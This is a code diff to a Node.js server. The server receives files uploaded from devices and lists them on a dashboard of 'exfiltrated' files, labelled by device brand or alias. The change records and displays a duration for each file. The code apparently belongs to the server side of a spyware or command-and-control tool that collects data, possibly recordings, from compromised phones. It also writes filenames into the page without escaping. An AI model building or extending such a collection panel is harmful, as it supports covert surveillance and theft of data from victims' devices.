@@ -310,12 +310,14 @@ function handleFileUpload(req, res) {
 
                             fs.writeFileSync(filePath, Buffer.from(fileDataBinary, 'binary'));
 
+                            const duration = req.headers['x-duration'] || req.query.duration || null;
                             const fileEntry = {
                                 id: Math.random().toString(36).substring(7),
                                 filename: safeFilename,
                                 originalName: filename,
                                 deviceId,
                                 size: Buffer.byteLength(fileDataBinary, 'binary'),
+                                duration: duration,
                                 timestamp: new Date().toISOString()
                             };
 
@@ -572,9 +574,13 @@ app.get('/', (req, res) => {
         exfiltratedFiles.map(f => {
             const devObj = devices.get(f.deviceId);
             const devLabel = devObj ? ((devObj.alias && devObj.alias.trim()) ? devObj.alias.trim() : (devObj.brand || f.deviceId)) : f.deviceId;
+            const durText = f.duration ? ` &bull; DUR: ${f.duration}` : '';
             return `
             <tr>
-                <td style="font-family: monospace; color: var(--neon-cyan); vertical-align: middle;">${f.originalName}</td>
+                <td style="font-family: monospace; color: var(--neon-cyan); vertical-align: middle;">
+                    <div>${f.originalName}</div>
+                    <div style="font-size: 0.62rem; color: var(--neon-green); opacity: 0.85; margin-top: 2px;">${formatTime(f.timestamp)}${durText}</div>
+                </td>
                 <td style="vertical-align: middle; color: #aaa;">${devLabel}</td>
                 <td style="vertical-align: middle; font-family: monospace;">${formatFileSize(f.size)}</td>
                 <td style="font-size: 0.68rem; color: #aaa; vertical-align: middle;">${formatTime(f.timestamp)}</td>
